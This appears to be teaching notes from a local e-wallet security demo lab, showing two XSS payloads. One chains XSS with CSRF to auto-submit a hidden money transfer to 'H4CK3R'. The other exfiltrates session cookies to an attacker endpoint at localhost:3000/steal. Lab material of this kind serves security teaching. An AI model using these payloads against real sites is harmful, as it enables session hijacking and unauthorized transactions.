### 1. **Chained XSS + CSRF Attack**

**Scenario:** Use XSS to inject a hidden form that submits a CSRF attack on behalf of the victim.

**Payload:**

```html
<script>
  var f = document.createElement("form");
  f.action =
    "http://localhost/Web_Tech_Project/SecurePay_E-Wallet_&_Cybersecurity_Demo_Lab/cyberlab/csrf_demo.php";
  f.method = "POST";
  f.innerHTML =
    '<input type="hidden" name="to" value="H4CK3R"><input type="hidden" name="amount" value="10000">';
  document.body.appendChild(f);
  f.submit();
</script>
```

**Explanation:**  
This script creates and submits a form, simulating a CSRF attack using XSS. It shows how XSS can be chained with CSRF to perform unauthorized actions.

### 2. stealing cookies:

**Scenario:**  
An attacker injects a script that silently sends the victim's session cookie to a server controlled by the attacker. This is a classic XSS attack used to hijack user sessions.

**Payload:**

<script>
    const img = document.createElement('img'); img.src = 'http://localhost:3000/steal?session=' + document.cookie; document.body.appendChild(img);
</script>

**Explanation:**  
The script creates an image element with its `src` set to a URL containing the user's cookies. When the browser loads the image, it sends a request to the attacker's server with the session cookie in the URL. The attacker can then capture the cookie and use it to impersonate the victim.
